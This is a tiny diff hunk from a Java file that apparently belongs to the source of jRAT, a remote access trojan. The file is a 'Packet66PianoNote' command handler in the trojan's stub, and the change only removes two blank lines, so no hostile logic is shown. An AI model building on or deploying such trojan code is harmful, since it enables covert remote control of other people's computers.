@@ -7,8 +7,6 @@ import javax.sound.sampled.SourceDataLine;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.Note;
 
-
-
 public class Packet66PianoNote extends AbstractIncomingPacket {
 
 	@Override
